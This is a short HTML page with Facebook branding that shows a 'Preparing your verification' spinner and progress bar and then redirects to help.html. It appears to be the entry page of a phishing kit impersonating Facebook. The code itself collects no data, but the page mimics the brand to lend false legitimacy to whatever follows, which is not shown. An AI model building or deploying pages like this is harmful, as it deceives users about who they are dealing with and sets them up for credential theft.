<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Loading…</title>
  <link rel="icon" href="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/Facebook_Logo_2023.png?v=1737135554085">
  <style>
    :root {
      --bg: #f0f2f5;
      --card: #ffffff;
      --accent: #1877f2;
    }
    * { box-sizing: border-box; margin:0; padding:0; }
    html,body { height:100%; font-family: "Roboto", Arial, sans-serif; background:var(--bg); }
    .wrap {
      min-height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:20px;
    }
    .loader-card {
      background:var(--card);
      border-radius:8px;
      padding:36px 40px;
      width:420px;
      max-width:92%;
      text-align:center;
      box-shadow: 0 12px 30px rgba(16,24,40,0.08);
    }
    .logo {
      width:72px;
      height:72px;
      margin: 0 auto 12px;
      border-radius:12px;
      overflow:hidden;
      display:flex;
      align-items:center;
      justify-content:center;
    }
    .logo img { width:100%; height:auto; display:block; }
    h1 { font-size:18px; margin-bottom:6px; color:#111; }
    p { margin-bottom:18px; color:#555; font-size:14px; line-height:1.35; }

    /* spinner */
    .spinner {
      width:64px;
      height:64px;
      margin: 0 auto 18px;
      position:relative;
    }
    .spinner::before,
    .spinner::after {
      content:"";
      position:absolute;
      inset:0;
      border-radius:50%;
      border:6px solid rgba(24,119,242,0.12);
    }
    .spinner::after {
      border-top-color:var(--accent);
      transform:rotate(0deg);
      animation: spin 1.1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .progress {
      height:8px;
      width:100%;
      background: #e9eefb;
      border-radius:999px;
      overflow:hidden;
    }
    .progress > i {
      display:block;
      height:100%;
      width:0%;
      background:linear-gradient(90deg, rgba(24,119,242,0.12), var(--accent));
      animation: grow 3s linear forwards;
    }
    @keyframes grow { to { width:100%; } }

    .small { font-size:13px; color:#777; margin-top:12px; }

    @media (max-width:420px){
      .loader-card { padding:22px; }
      .spinner { width:52px; height:52px; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="loader-card" role="status" aria-live="polite">
      <div class="logo">
        <img src="facebook photo.jpeg" alt="logo">
      </div>
      <div class="spinner" aria-hidden="true"></div>
      <h1>Preparing your verification</h1>
      <p>Please wait while we prepare your page. You will be redirected automatically.</p>

      <div class="progress" aria-hidden="true"><i></i></div>
      <div class="small">Redirecting in <strong id="count">3</strong> seconds…</div>
    </div>
  </div>

  <script>
    // Redirect timeout (in seconds)
    const REDIRECT_SECONDS = 3;
    const target = "help.html"; // page to open after loader

    // Countdown display
    let remaining = REDIRECT_SECONDS;
    const el = document.getElementById("count");
    el.textContent = remaining;

    const interval = setInterval(() => {
      remaining -= 1;
      if (el) el.textContent = Math.max(0, remaining);
      if (remaining <= 0) {
        clearInterval(interval);
        // redirect
        window.location.href = target;
      }
    }, 1000);

    // Safety: also redirect after the same total time (in case setInterval missed)
    setTimeout(() => {
      window.location.href = target;
    }, REDIRECT_SECONDS * 1000 + 200);
  </script>
</body>
</html>
